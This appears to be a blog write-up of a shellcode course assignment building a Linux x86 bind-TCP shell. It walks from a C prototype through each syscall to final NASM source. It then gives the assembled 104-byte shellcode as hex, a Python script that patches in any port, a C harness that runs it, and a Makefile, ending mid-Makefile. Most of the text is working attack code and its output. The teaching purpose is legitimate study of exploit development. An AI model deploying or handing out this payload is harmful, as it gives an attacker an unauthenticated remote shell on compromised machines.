---
layout: single
classes: wide
title:  "Shell Bind TCP Shellcode"
date:   2020-03-08 18:31:04 +0800
categories: jekyll update
---

A bind shell is setup on the target host and binds to a specific port to listens for an incoming connection from the attacker host.

## Requirements

- Create Shell_Bind_TCP shellcode
    - Binds to a port
    - Execs Shell on incoming connection
- Port number should be easily configurable

## Prototype

I decided to write the initial application in C to understand how a bind shell works at a higher level. After that i could analyze the code in preparation for writting the actual code in assembly. This prototype will listen on `0.0.0.0` and port `8443`. I tried to make the program as simple as possible without any error check. I've add lot of comments on the C code, hope it should be easy to understand.

{% highlight c linenos %}
#include<stdio.h>
#include<sys/socket.h>
#include<arpa/inet.h>

#define SHELL "/bin/bash"
#define BIND_PORT 8443

int main(int argc, char *argv[])
{
    int i, server_sock, new_sock;
    struct sockaddr_in server_addr;

    // http://man7.org/linux/man-pages/man2/socket.2.html
    // Create the socket:
    // Address Family - AF_INET (IPv4)
    // Type - SOCK_STREAM (TCP protocol)
    // Protocol - 0 (IP protocol)
    server_sock = socket(AF_INET, SOCK_STREAM, 0);

    // http://man7.org/linux/man-pages/man7/ip.7.html
    // Prepare the socketaddr_in structure for bind()
    // AF_INET - IPv4
    // INADDR_ANY - 0.0.0.0
    // BIND_PORT - 8443
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(BIND_PORT);

    // http://man7.org/linux/man-pages/man2/bind.2.html
    // Bind a socket to the ip address and port
    bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // http://man7.org/linux/man-pages/man2/listen.2.html
    // Listen for incoming connection
    listen(server_sock, 0);

    // http://man7.org/linux/man-pages/man2/accept.2.html
    // Accept the incoming connection
    new_sock = accept(server_sock, NULL, NULL);

    // http://man7.org/linux/man-pages/man2/dup.2.html
    // Duplicate the file descriptors for stdin[0], stdout[1], stderr[2]
    //  to a newly created socket [new_sock]
    // This will redirect all input, output and error over the listening
    //  socket, allowing interacting with the executed program
    for (i=0; i<=2; i++)
    {
        dup2(new_sock, i);
    }

    // http://man7.org/linux/man-pages/man2/execve.2.html
    // Execute the program SHELL /bin/bash
    execve(SHELL, NULL, NULL);

    return 0;
}
{% endhighlight %}

### Testing the prototype

After compiling C code, i ran the application which listening to `0.0.0.0` port `8443` and i could connect to the port `8443` from another terminal and able to get shell. Also from the `strace` command output below i could trace the specified set of system calls used during the execution. And from here i could start for the assembly code.

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/bind$ gcc ./bind_shell.c -o bind_shell

kecebong@ubuntu:~/slae32/assigment/bind$ strace -e socket,bind,listen,accept,dup2,execve ./bind_shell
execve("./bind_shell", ["./bind_shell"], [/* 20 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(8443), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 0)                            = 0
accept(3, 0, NULL)                      = 4
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin/bash", [0], [/* 0 vars */]) = 0
socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 5
socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 5

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
kecebong@ubuntu:~/slae32/assigment/bind$ lsof -i :8443
COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
bind_shel 9715 kecebong    3u  IPv4 198288      0t0  TCP *:8443 (LISTEN)

kecebong@ubuntu:~/slae32/assigment/bind$ nc -v localhost 8443
Connection to localhost 8443 port [tcp/*] succeeded!
whoami
kecebong
hostname -f
ubuntu
{% endhighlight %}

## Implementation

[Syscalls](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux) are the interface between user programs and the Linux kernel. They are used to let the kernel perform various system tasks, such as file access, process management and networking. In the C programming language, you would normally call a wrapper function which executes all required steps or even use high-level features such as the standard IO library.

On both Linux x86 and Linux x86_64 systems you can make a syscall by calling interrupt `0x80` using the `int 0x80` command. Parameters are passed by setting the general purpose registers as following:

![image](/assets/img/assigment1_syscall.png)

The syscall numbers are described in the Linux generated file `/usr/include/i386-linux-gnu/asm/unistd_32.h`. Below are the breakdown of the system call used in above C prototype and convert to assembly code.

### 0. Initialization

The assembly code started with zeroing the registers, in this case `eax`, `ecx` and `edx`.

{% highlight nasm linenos %}
; zeroing the registers
xor ecx, ecx    ; ecx = 0
mul ecx         ; eax = 0
cdq             ; xor edx, edx
{% endhighlight %}

### 1. Creating socket [ `socket` ]

The C code:
{% highlight c %}
server_sock = socket(AF_INET, SOCK_STREAM, 0);
{% endhighlight %}

To call the C equivalent of `socket()` on x86_32 (see notes section on `man 2 socketcall`), we need to use `socketcall` with the `SYS_SOCKET` argument. From the [man 2 socketcall](http://man7.org/linux/man-pages/man2/socketcall.2.html), the following is the format of the `socketcall` funtion.

{% highlight c %}
int socketcall(int call, unsigned long *args);
{% endhighlight %}

- `call` determines which socket function to invoke.
    - `SYS_SOCKET`
- `args` points to a block containing the actual arguments, which are passed through to the appropriate call.
    - `(int domain, int type, int protocol)`
        - domain = `AF_INET` # ipv4
        - type = `SOCK_STREAM` # tcp
        - protocol = 0 # tcp

Also the man page of [man 2 socket](http://man7.org/linux/man-pages/man2/socket.2.html), the following is the format of the `socket` function.
{% highlight c %}
int socket(int domain, int type, int protocol);
{% endhighlight %}

to get the syscall number on Ubuntu x86:

{% highlight console %}
# socketcall = 102 ~ 0x66
kecebong@ubuntu:~/slae32/assigment/bind$ grep socket /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_socketcall         102

# SYS_SOCKET = 1 ~ 0x01
kecebong@ubuntu:~/slae32/assigment/bind$ grep SYS_ /usr/include/linux/net.h
#define SYS_SOCKET      1               /* sys_socket(2)                */

# AF_INET = 2 ~ 0x02
kecebong@ubuntu:~/slae32/assigment/bind$ grep _INET /usr/include/i386-linux-gnu/bits/socket.h
#define PF_INET         2       /* IP protocol family.  */
#define AF_INET         PF_INET

# SOCK_STREAM = 1 ~ 0x01
kecebong@ubuntu:~/slae32/assigment/bind$ grep SOCK_STREAM /usr/include/i386-linux-gnu/bits/socket.h
SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based
{% endhighlight %}

convert the decimal to hex:
{% highlight console %}
# convert to hex - socketcall = 102 ~ 0x66
kecebong@ubuntu:~/slae32/assigment/bind$ python -c 'print hex(102)'
0x66
{% endhighlight %}

so for this `socket` system call we need three registers:
- EAX : socketcall (0x66)
- EBX : SYS_SOCKET (0x01)
- ECX : (AF_INET, SOCK_STREAM, 0)
    - AF_INET : 0x02
    - SOCK_STREAM : 0x01
    - protocol : 0x00

and the following is the assembly code:

{% highlight nasm linenos %}
socket:
    ; create a socket
    ; server_sock = socket(AF_INET, SOCK_STREAM, 0);
    ; 
    ; eax : socketcall = 102 ~ 0x66
    ; ebx : SYS_SOCKET = 1 ~ 0x01
    ; ecx : args = esp (AF_INET = 0x02, SOCK_STREAM = 0x01, PROTOCOL = 0x00)
    ;
    push byte 0x66  ; syscall 
    pop eax          
    push byte 0x01  ; SYS_SOCKET
    pop ebx

    ; parameters for socket 
    ;
    ; (AF_INET, SOCK_STREAM, protocol)
    ; stack:
    ;   ecx => esp
    ;   0x02  - AF_INET
    ;   0x01  - SOCK_STREAM
    ;   0x00  - protocol
    push ecx        ; protocol    = 0 ~ 0x00
    push byte 0x01  ; SOCK_STREAM = 1 ~ 0x01
    push byte 0x02  ; AF_INET     = 2 ~ 0x02
    mov ecx, esp    ; args = pointing ecx to top of stack esp
    int 0x80        ; make a socket syscall

    ; store return sockfd on eax to edi
    ; that will be use for next instruction
    xchg edi, eax 
{% endhighlight %}

### 2. Binding the socket [ `bind` ]

When a socket is created with `socket()`, it exists in a name space (address family) but has no address assigned to it. `bind()` assigns the address specified by `addr` to the socket referred to by the file descriptor `sockfd`.  `addrlen` specifies the size, in bytes, of the address structure pointed to by addr. Traditionally, this operation is called "assigning a name to a socket".

The C code:
{% highlight c %}
// server_addr
server_addr.sin_family = AF_INET;
server_addr.sin_addr.s_addr = INADDR_ANY;
server_addr.sin_port = htons(atoi(argv[1]));

// Bind
bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
{% endhighlight %}

from the [man 2 bind](http://man7.org/linux/man-pages/man2/bind.2.html), the `bind` function format is 
{% highlight c %}
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
{% endhighlight %}

based on [man 7 ip ](http://man7.org/linux/man-pages/man7/ip.7.html), below is the address format
{% highlight c %}
struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};
{% endhighlight %}

to get the system call number on Ubuntu x86
{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/bind$ grep SYS_BIND /usr/include/linux/net.h
#define SYS_BIND        2               /* sys_bind(2)   */
{% endhighlight %}

convert the port number into hex and then reversed for network byte order.
{% highlight console %}
# to get the port number in hex
kecebong@ubuntu:~/slae32/assigment/bind$ python
>>> port=8443
>>> s="%04X" % (port)
>>> print "0x" + "".join(map(str.__add__, s[-2::-2], s[-1::-2])).lower()
0xfb20
>>>

# to get the "/bin//sh" string into hex
kecebong@ubuntu:~/slae32/assigment/bind$ python
>>> shell="/bin//sh"
>>> print "0x" + shell[::-1][4:].encode('hex')
0x6e69622f
>>> print "0x" + shell[::-1][:4].encode('hex')
0x68732f2f
>>>
{% endhighlight %}

so for this `bind` system call we need three registers:
- EAX : `socketcall` (0x66)
- EBX : `SYS_BIND` (0x02)
- ECX : `(int sockfd, const struct sockaddr *addr, socklen_t addrlen)`
    - `sockfd` : the socket fd returned from previous `socket` function
    - `struct sockaddr`: 
        - `sin_family` : `AF_INET` (0x01)
        - `sin_port`   : 8443 (convert to hex in network byte order 0xfb20)
        - `sin_addr`   : `INADDR_ANY` (bound to all local interfaces 0.0.0.0)
    - `socklen_t addrlen` : default is 16 (0x10)

and the following is the assembly code:

{% highlight nasm linenos %}
bind:
    ; Bind a name to a socket
    ;
    ; eax = socketcall 0x66
    ; ebx = SYS_BIND 0x02
    ; ecx = args = esp
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax
    push byte 0x02      ; SYS_BIND = 2 ~ 0x02
    pop ebx

    ; struct sockaddr_in
    ; 
    ; stack:
    ;   ecx => esp 
    ;   0x02    - AF_INET
    ;   0xfb20  - port 8443
    ;   0x00    - INADDR_ANY
    push edx            ; INADDR_ANY = 0.0.0.0
    push word 0xfb20    ; PORT 8443  ~ 0x20fb - in reverse network byte order 0xfb20
    push bx             ; AF_INET = 2 ~ 0x02
    mov ecx, esp        ; point the ecx to the top of stack esp

    ; parameters for bind
    ;
    ; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; stack:
    ;   ecx => esp
    ;   sockfd              - socket fd from previous socket call
    ;   struct sockaddr_in  - see above
    ;   0x10                - addr len
    push byte 0x10      ; addr len default 16 ~ 0x10
    push ecx            ; &server_addr
    push edi            ; sockfd
    mov ecx, esp        ; point the ecx to the top of stack esp

    int 0x80
{% endhighlight %}

### 3. Listen connection [ `listen` ]

The `listen()` marks the socket referred to by `sockfd` as a passive socket, that is, as a socket that will be used to accept incoming connection requests using `accept(2)`. 

The C code:

{% highlight c %}
// Listen for incoming connection
listen(server_sock, 0);
{% endhighlight %}

From the [man 2 listen](http://man7.org/linux/man-pages/man2/listen.2.html), `listen` function format:
{% highlight c %}
int listen(int sockfd, int backlog);
{% endhighlight %}

- The `sockfd` argument is a file descriptor that refers to a socket of type `SOCK_STREAM` or `SOCK_SEQPACKET`.
- The `backlog` argument defines the maximum length to which the queue of pending connections for sockfd may grow.

To get the system call number on Ubuntu x86
{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/bind$ grep SYS_LISTEN /usr/include/linux/net.h
#define SYS_LISTEN      4               /* sys_listen(2)                */
{% endhighlight %}

so for this `listen` system call we need three registers:
- EAX : `socketcall` (0x66)
- EBX : `SYS_LISTEN` (0x04)
- ECX : `(int sockfd, int backlog)`
    - `sockfd` : the socket fd returned from previous `socket` function
    - `backlog`: 0x00

and the following is the assembly code:

{% highlight nasm linenos %}
listen:
    ; start listening
    ; listen(server_sock, 0)
    ;
    ; eax = socketcall 0x66
    ; ebx = SYS_LISTEN 0x04
    ; ecx = args = esp
    push byte 0x66  ; socketcall 102 ~ 0x66
    pop eax
    push byte 0x4   ; SYS_LISTEN = 0x04
    pop ebx

    ; parameters of listen
    ; (server_sock, 0)
    ;
    ; stack:
    ;   ecx => esp
    ;   sockfd  - sockfd returned from previous socket function
    ;   0x00    - backlog 0x00
    xor esi, esi    ; zeroing esi
    push esi        ; backlog 0x00
    push edi        ; sockfd
    mov ecx, esp    ; ecx pointing to top of stack esp  

    int 0x80
{% endhighlight %}

### 4. Accept connection [ `accept` ]

The `accept()` system call is used with connection-based socket types (`SOCK_STREAM`, `SOCK_SEQPACKET`).  It extracts the first connection request on the queue of pending connections for the listening socket, `sockfd`, creates a new connected socket, and returns a new file descriptor referring to that socket.

The C code:

{% highlight c %}
// Accept the incoming connection
new_sock = accept(server_sock, NULL, NULL);
{% endhighlight %}

from the [man 2 accept](http://man7.org/linux/man-pages/man2/accept.2.html), the `accept` function format:
{% highlight c %}
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
{% endhighlight %}

To get the system call number on Ubuntu x86
{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/bind$ grep SYS_ACCEPT /usr/include/linux/net.h
#define SYS_ACCEPT      5               /* sys_accept(2) 
{% endhighlight %}

so for this `accept` system call we need three registers:
- EAX : `socketcall` (`0x66`)
- EBX : `SYS_ACCEPT` (`0x05`)
- ECX : `(int sockfd, struct sockaddr *addr, socklen_t *addrlen)`
    - `sockfd` : the socket fd returned from previous `socket` function
    - `struct sockaddr *addr`: `0x00`
    -  `socklen_t *addrlen` : `0x00`

and the following is the assembly code:
{% highlight nasm linenos %}
accept:
    ; accepting the incoming connection
    ; accept(server_sock, NULL, NULL);
    ; 
    ; eax = socketcall 0x66
    ; ebx = SYS_ACCEPT 0x05
    ; ecx = args = esp
    push byte 0x66  ; socketcall 102 ~ 0x66
    pop eax
    push byte 0x05  ; SYS_ACCEPT = 0x05
    pop ebx

    ; parameters of accept
    ; (server_sock, NULL, NULL)
    ; 
    ; stack:
    ;   ecx => esp
    ;   sockfd - sockfd returned from previous socket function
    ;   0x00   - sockaddr
    ;   0x00   - socklen_t
    push esi        ; socklen_t *addrlen = null
    push esi        ; struct sockaddr *addr = null
    push edi        ; sockfd
    mov ecx, esp    ; ecx pointing to top of stack esp  
    int 0x80
{% endhighlight %}

### 5. Duplicate file descriptors [ `dup2` ]

The `dup2` syscall is utilized to "clone" or duplicate file handles. If utilized in C or C++ the prototype is `int dup2 (int oldfilehandle, int newfilehandle)`. The `dup2` syscall clones the file handle `oldfilehandle` onto the file handle `newfilehandle`.

The C code:
{% highlight c %}
for (i=0; i<=2; i++)
{
    dup2(new_sock, i);
}
{% endhighlight %}

From [man 2 dup2](http://man7.org/linux/man-pages/man2/dup.2.html), following is the format of `dup2` function.
{% highlight c %}
int dup2(int oldfd, int newfd);
{% endhighlight %}

In this case the `oldfd` is the socket fd from `socket` function, and the `newfd` are `stdin`, `stdout` and `stderr`.

to get the system call number on Ubuntu x86
{% highlight console %}
kecebong@ubuntu:~$ grep dup2  /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_dup2                63

kecebong@ubuntu:~/slae32/assigment/bind/asm$ python
>>> hex(63)
'0x3f'
{% endhighlight %}

and the following is the assembly code:

{% highlight nasm linenos %}
; dup2 arg new_sock
mov ebx, eax    ; save the new socket returned from `accept` function from ebx into eax

; for looping
; set ecx = 0x2 for counter 0-2
push byte 0x2
pop ecx

; Duplicate stdin/stdout/stderr to client socket
;
; dup2(new_sock, 0) - stdin
; dup2(new_sock, 1) - stdout
; dup2(new_sock, 2) - stderr
;
; al  = 0x3f
; ebx = client socket new_sock
; ecx = 0x2 => 2, 1, 0 - counter
dup2:
    mov al, 0x3f   ; dup2 = 63 ~ 0x3f
    int 0x80
    dec ecx
    jns dup2       ; continue to jump to dump2 label (loop) until the signed flag is set
{% endhighlight %}

### 6. Execute the shell [ `execve` ]

The `execve()` executes the program referred to by `pathname`. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments. From the [man 2 execve](http://man7.org/linux/man-pages/man2/execve.2.html), following is the syntax:

{% highlight c %}
int execve(const char *pathname, char *const argv[], char *const envp[]);
{% endhighlight %}

The first argument should be the program name; the second should be an array containing the program name and arguments. The last argument should be the environment data.

The C code:
{% highlight c linenos %}
execve(SHELL, NULL, NULL);
{% endhighlight %}

To get the syscall number on Ubuntu x86:

{% highlight console %}
kecebong@ubuntu:~$ grep execve /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_execve              11
{% endhighlight %}

and the following is the assembly code:

{% highlight nasm linenos %}
execve:
    ; execve
    push byte 0x0b          ; execve = 11 ~ 0x0b
    pop eax                 ; eax = 0x0b

    ; arg execve(SHELL, NULL, NULL);
    xor ecx, ecx            ; zeroing ecx
    push ecx                ; null
    push ecx                ; null
    push 0x68732f2f         ; "hs//""
    push 0x6e69622f         ; "nib/"
    mov ebx, esp            ; copy arguments on the stack to ecx
    int 0x80
{% endhighlight %}

## The Final Assembly Code

Putting all pieces together, this is the first assignment solution in assembler.

{% highlight nasm linenos %}
global _start

section .text

_start:
    xor ecx, ecx        ; ecx = 0
    mul ecx             ; eax = 0
    cdq                 ; xor edx, edx

socket:
    ; socketcall
    push byte 0x66      ; socketcall 102 ~ 0x66 
    pop eax             ; eax = 0x66
    push byte 0x01      ; SYS_SOCKET = 1
    pop ebx             ; ebx = 0x1
    
    ; socket args            
    push ecx            ; ecx = 0
    push byte 0x01      ; SOCK_STREAM = 0x01
    push byte 0x02      ; AF_INET = 0x02 
    mov ecx, esp        ; copy arguments on the stack to ecx
    int 0x80            ; return sockfd to eax

    xchg edi, eax       ; store return sockfd on eax to edi

bind:
    ; socketcall
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax             ; eax = 0x66
    push byte 0x02      ; SYS_BIND = 0x02
    pop ebx             ; ebx = 0x2

    ; bind args
    push edx            ; INADDR_ANY = 0
    push word 0xfb20    ; PORT 8443 = 0x20fb
    push bx             ; AF_INET =  0x02 
    mov ecx, esp        ; copy arguments on the stack to ecx

    push byte 0x10      ; addr len default 16
    push ecx            ; &server_addr
    push edi            ; sockfd
    mov ecx, esp        ; copy arguments on the stack to ecx
    int 0x80

;    // Listen
;    listen(server_sock, 0);
listen:
    ; socketcall
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax             ; eax = 0x66
    push byte 0x4       ; SYS_LISTEN = 4 ~ 0x04
    pop ebx             ; ebx = 0x04

    ; arg listen(server_sock, 0)
    xor esi, esi        ; esi = 0
    push esi            ; esi = 0 
    push edi            ; edi = sockfd
    mov ecx, esp        ; copy arguments on the stack to ecx
    int 0x80

new_sock:
    ; socketcall
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax             ; eax = 0x66
    push byte 0x05      ; SYS_ACCEPT = 5 ~ 0x05
    pop ebx             ; ebx = 0x05

    ; arg accept(server_sock, NULL, NULL);
    push esi            ; null
    push esi            ; null
    push edi            ; sockfd
    mov ecx, esp        ; copy arguments on the stack to ecx
    int 0x80

    ; dup2 arg new_sock
    mov ebx, eax        ; newsockfd

    ; for looping 
    push byte 0x02      ; set counter 2
    pop ecx             ; ecx = 0x02

; dup2(new_sock, 0); 
; dup2(new_sock, 1);
; dup2(new_sock, 2);
dup2:
    ; dup2
    mov al, 0x3f        ; dup2 = 63 ~ 0x3f
    int 0x80
    dec ecx             ; 2, 1, 0
    jns dup2

; execve(SHELL, NULL, NULL);
execve:
    ; execve
    push byte 0x0b      ; execve = 11 ~ 0x0b
    pop eax             ; eax = 0x0b

    ; arg execve(SHELL, NULL, NULL);
    xor ecx, ecx        ; ecx = 0
    push ecx            ; null
    push ecx            ; null
    push 0x68732f2f     ; "hs//""
    push 0x6e69622f     ; "nib/"
    mov ebx, esp        ; copy arguments on the stack to ecx
    int 0x80
{% endhighlight %}

## Testing

Testing and run the shellcode, as we can see on the output below the shellcode is listening to `*` and port `8443` and i'm able to connect to the shell. I use helper script to do the repetivie tasks like compile and run the shellcode, please see the helper script [Makefile](#helper-script) on below section.

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/bind/asm$ make clean-all
[*] Cleanup bind_shell.*
rm -f bind_shell.txt
rm -f bind_shell.o
rm -f bind_shell
[*] Cleanup shellcode.*
rm -f shellcode

kecebong@ubuntu:~/slae32/assigment/bind/asm$ make
[*] Assembling with nasm...
nasm -f elf32 -o bind_shell.o bind_shell.nasm

[*] Linking object...
ld -m elf_i386 -o bind_shell bind_shell.o

[*] Size of Shellcode:
   text    data     bss     dec     hex filename    
   104       0       0     104      68 bind_shell

[*] Shellcode:
"\x31\xc9\xf7\xe1\x99\x6a\x66\x58\x6a\x01\x5b\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\x6a\x66
\x58\x6a\x02\x5b\x52\x66\x68\x20\xfb\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x6a\x66
\x58\x6a\x04\x5b\x31\xf6\x56\x57\x89\xe1\xcd\x80\x6a\x66\x58\x6a\x05\x5b\x56\x56\x57\x89\xe1
\xcd\x80\x89\xc3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x6a\x0b\x58\x31\xc9\x51\x51\x68\x2f
\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

[*] Compiling shellcode...
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

kecebong@ubuntu:~/slae32/assigment/bind/asm$ make run-shellcode
[*] Running shellcode...
./shellcode
Shellcode Length:  104

────────────────────────────────────────────────────────────────────────────────────────────────────────
kecebong@ubuntu:/mnt/hgfs/slae32/assigment/bind/asm$ lsof -i :8443
COMMAND     PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
shellcode 10079 kecebong    3u  IPv4 203379      0t0  TCP *:8443 (LISTEN)

kecebong@ubuntu:/mnt/hgfs/slae32/assigment/bind/asm$ nc -v localhost 8443
Connection to localhost 8443 port [tcp/*] succeeded!
whoami
kecebong
uptime
 00:11:18 up 2 days, 20:48,  2 users,  load average: 0.02, 0.02, 0.05
hostname
ubuntu
{% endhighlight %}

### Demo
![image](/assets/img/assigment1.gif)

## Port Customization

Above assembly code is using static port number, to make it more flexible and customize the port number, i've created the wrapper script that will replace the port number. From the shellcode above, we can see that `\x20\xfb` is the port number `8443`. So this wrapper script will just replace this with the port number we choose.

![image](/assets/img/shellcode1.png)

### Source code
{% highlight python linenos %}
#!/usr/bin/env python

import sys

SHELLCODE=\
"\"\\x31\\xc9\\xf7\\xe1\\x99\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x51\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80
\\x97\\x6a\\x66\\x58\\x6a\\x02\\x5b\\x52\\x66\\x68%s\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1
\\xcd\\x80\\x6a\\x66\\x58\\x6a\\x04\\x5b\\x31\\xf6\\x56\\x57\\x89\\xe1\\xcd\\x80\\x6a\\x66\\x58\\x6a\\x05
\\x5b\\x56\\x56\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x6a
\\x0b\\x58\\x31\\xc9\\x51\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\""

if len(sys.argv) != 2:
  print("[-1] ERROR: Enter the port number")
  exit()

port=sys.argv[1]

if ((int(port) > 65535) or (int(port) < 256)):
    print("\n[-] ERROR: Port number must be between 256 and 65535\n")
    exit()

hexport = hex(int(port)).replace('0x','')
if len(hexport)<4:
    hexport = '0'+hexport

if '00' in hexport[:2] or '00' in hexport[2:4]:
    print "[-] FAILED: port number null bytes found!, use other port"
    sys.exit(1)

print("Port: %s"% port)
print("Hex Port: %s"% hexport)
print("\nShellcode:")
print(SHELLCODE%("\\x" + str(hexport[:2]) + "\\x" + str(hexport[2:4])))
print("\n")
{% endhighlight %}

### Testing

Test the port customization script, for example change the shellcode port number to `8444`
{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/bind/asm$ ./gen_bin_tcp.py 8444
Port: 8444
Hex Port: 20fc

Shellcode:
"\x31\xc9\xf7\xe1\x99\x6a\x66\x58\x6a\x01\x5b\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\x6a\x66\x58\x6a\x02
\x5b\x52\x66\x68\x20\xfc\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x6a\x66\x58\x6a\x04\x5b\x31\xf6
\x56\x57\x89\xe1\xcd\x80\x6a\x66\x58\x6a\x05\x5b\x56\x56\x57\x89\xe1\xcd\x80\x89\xc3\x6a\x02\x59\xb0\x3f
\xcd\x80\x49\x79\xf9\x6a\x0b\x58\x31\xc9\x51\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

kecebong@ubuntu:~/slae32/assigment/bind/asm$ cat skel.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x99\x6a\x66\x58\x6a\x01\x5b\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\x6a\x66\x58\x6a\x02
\x5b\x52\x66\x68\x20\xfc\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x6a\x66\x58\x6a\x04\x5b\x31\xf6
\x56\x57\x89\xe1\xcd\x80\x6a\x66\x58\x6a\x05\x5b\x56\x56\x57\x89\xe1\xcd\x80\x89\xc3\x6a\x02\x59\xb0\x3f
\xcd\x80\x49\x79\xf9\x6a\x0b\x58\x31\xc9\x51\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

kecebong@ubuntu:~/slae32/assigment/bind/asm$ gcc -fno-stack-protector -z execstack skel.c -o skel
kecebong@ubuntu:~/slae32/assigment/bind/asm$ ./skel
Shellcode Length:  104

────────────────────────────────────────────────────────────────────────────────────────────────────────
kecebong@ubuntu:~/slae32/assigment/bind/asm$ lsof -i :8444
COMMAND  PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
test    9774 kecebong    3u  IPv4 293136      0t0  TCP *:8444 (LISTEN)
{% endhighlight %}

### Demo
![image](/assets/img/assigment1_2.gif)

## Helper script

i've created the `Makefile` to do the repetitive tasks. So when we need to run the shellcode, we just need to run these lines:
- `make clean-all`
- `make`
- `make run-shellcode`

### Usage

{% highlight console %}
$ make help
# Usage: make [option]

# option:
build              Compile the assembly code.
disassemble        Run disassemble on compiled assembly.
hex                Generate the opcode of compiled assembly.
check              Check null bytes on the shellcode.
run                Run the compiled assembly.
debug              Run debugging on the compiled assembly.
clean              Clean up the compiled assembly.
run-shellcode      Run the shellcode.
debug-shellcode    Debug the shellcode.
clean-shellcode    Clean up the compiled shellcode.
help               Show this help.
{% endhighlight %}

### Source code

{% highlight makefile linenos %}
TARGET=$(target)
TEST=shellcode
TEMPFILE:=$(shell mktemp -u --tmpdir=.)

all: build hex shellcode
clean-all: clean clean-shellcode

build: $(TARGET).o ## Compile the assembly code.
	@echo -e '\n[*] Linking object...'
	ld -m elf_i386 -o $(TARGET) $(TARGET).o
	@rm -f $(TARGET).o

$(TARGET).o: $(TARGET).nasm
	@echo -e '[*] Assembling with nasm...'
	nasm -f elf32 -o $(TARGET).o $(TARGET).nasm

disassemble: ## Run disassemble on compiled assembly.
	@echo -e '[*] Running disassemble $(TARGET)'
	objdump -d $(TARGET) -M intel

hex: ## Generate the opcode of compiled assembly.
	@echo -e '\n[*] Size of Shellcode:'
	@size $(TARGET)
	@echo -e '\n[*] Shellcode:'
	@objdump -d $(TARGET) | \
	grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | \
	sed 's/$$/\n/' | sed "s/^/\"/" | sed "s/$$/\"/g" > $(TARGET).txt
	@cat $(TARGET).txt
	@echo

check: ## Check null bytes on the shellcode.
	@echo -e '[*] Checking null bytes inside shellcode:\n'
	@if objdump -d $(TARGET) -M intel | grep 00; then \
		echo "[-] FAILED: Null bytes Found!"; \
	else \
		echo "[+] OK: No Null bytes found!"; \
	fi
	@echo

run: ## Run the compiled assembly.
	@echo -e '[*] Running $(TARGET)...'
	./$(TARGET)

debug: ## Run debugging on the compiled assembly.
	@echo -e '[*] Debugging $(TARGET)...'
	gdb -q ./${TARGET}

clean: ## Clean up the compiled assembly.
	@echo -e '[*] Cleanup $(TARGET).*'
	rm -f $(TARGET).txt
	rm -f $(TARGET).o
	rm -f $(TARGET)

#build-shellcode: $(TEST) tmp 

tmp:
	@cat $(TARGET).txt | sed 's|\\|\\\\|g' > tmp.txt

$(TEST): $(TARGET).txt skel.c tmp
	@echo -e '[*] Compiling shellcode...'
	@cp -f skel.c $(TEMPFILE).c
